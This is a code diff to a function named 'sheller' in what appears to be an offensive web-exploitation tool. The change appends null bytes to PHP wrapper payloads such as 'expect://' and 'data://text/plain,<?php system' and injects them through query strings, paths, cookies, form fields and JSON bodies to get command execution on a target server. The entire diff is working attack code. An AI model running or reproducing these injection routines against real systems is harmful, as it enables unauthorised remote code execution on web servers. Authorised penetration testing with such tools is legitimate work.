@@ -1109,6 +1109,9 @@ def sheller(
                     if app:
                         app.processEvents()
         elif technique == 6:
+            nullbyte_used = ""
+            if nullist:
+                nullbyte_used = nullist[0]
             wrappersPart1 = [
                 'expect://{}'.format(PAYLOAD),
                 'data://text/plain,<?php system'
@@ -1151,12 +1154,16 @@ def sheller(
                     app.processEvents()
                 if attack == 1:
                     prep = query(
-                        "", "", wrapper, "", keyword, url, url2, s
+                        "", "", wrapper, nullbyte_used, keyword,
+                        url, url2, s,
                     )[0]
                 elif attack == 2:
-                    prep = inpath("", "", wrapper, "", url, url2, s)[0]
+                    prep = inpath(
+                        "", "", wrapper, nullbyte_used, url,
+                        url2, s,
+                    )[0]
                 elif attack == 3:
-                    s.cookies.set(selected, wrapper)
+                    s.cookies.set(selected, wrapper + nullbyte_used)
                     req = requests.Request(method="GET", url=url)
                     prep = s.prepare_request(req)
                 elif attack == 4:
@@ -1164,13 +1171,15 @@ def sheller(
                     for prop in post_data.split("&"):
                         pair = prop.split("=")
                         if pair[1].strip() == "INJECT":
-                            pair[1] = wrapper
+                            pair[1] = wrapper.strip() + nullbyte_used
                         data[pair[0].strip()] = pair[1].strip()
                     assert data != {}
                     random_ua(s)
                     prep = post_plain(url, data, s)
                 elif attack == 5:
-                    activated = post_data.replace("INJECT", wrapper)
+                    activated = post_data.replace(
+                        "INJECT", wrapper + nullbyte_used
+                    )
                     activated = activated.replace("\\", "\\\\")
                     data = json.loads(activated)
                     assert data != {}
@@ -1212,9 +1221,11 @@ def sheller(
                     app.processEvents()
                 if attack == 1:
                     if "?" not in url:
-                        cont = "?" + keyword + "=" + wrapper + url2
+                        cont = "?" + keyword + "=" + wrapper
+                        cont = cont + nullbyte_used + url2
                     else:
-                        cont = "&" + keyword + "=" + wrapper + url2
+                        cont = "&" + keyword + "=" + wrapper
+                        cont = cont + nullbyte_used + url2
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
@@ -1222,7 +1233,7 @@ def sheller(
                     )
                     prep = s.prepare_request(req)
                 elif attack == 3:
-                    s.cookies.set(selected, wrapper)
+                    s.cookies.set(selected, wrapper + nullbyte_used)
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
